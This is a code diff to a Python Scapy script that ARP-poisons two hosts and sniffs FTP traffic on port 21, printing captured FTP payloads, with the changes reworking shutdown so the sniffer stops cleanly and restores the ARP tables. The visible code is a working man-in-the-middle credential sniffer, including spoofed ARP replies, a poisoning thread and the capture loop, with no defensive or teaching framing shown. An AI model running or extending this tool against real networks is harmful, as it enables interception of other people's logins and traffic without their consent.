@@ -49,7 +49,6 @@ def handle_packet(pkt):
         if arp.pdst in (ip_src, ip_target):
             sendp(Ether(dst=arp.hwsrc) / ARP(op=2, pdst=arp.psrc, hwdst=arp.hwsrc, psrc=arp.pdst), verbose=0)
         return
-    # Skip forwarded packets (outgoing) — only process what arrives TO us
     if pkt.haslayer(Ether) and pkt[Ether].dst.lower() != my_mac.lower():
         return
     if not pkt.haslayer("TCP"): return
@@ -64,15 +63,17 @@ def handle_packet(pkt):
         print(f"[FTP] {payload}")
 
 def signal_handler(s, f):
-    global running
-    running = False
-
-signal.signal(signal.SIGINT, signal_handler)
+    raise KeyboardInterrupt
 signal.signal(signal.SIGTERM, signal_handler)
 
 my_mac = get_if_hwaddr("eth0")
 
 print(f"[*] ARP poisoning: {ip_src} <-> {ip_target}  (Ctrl+C to stop)")
 threading.Thread(target=poison, daemon=True).start()
-sniff(filter="arp or tcp port 21", prn=handle_packet, store=0, stop_filter=lambda p: not running, timeout=None)
-restore()
+try:
+    sniff(filter="arp or tcp port 21", prn=handle_packet, store=0)
+except KeyboardInterrupt:
+    pass
+finally:
+    running = False
+    restore()
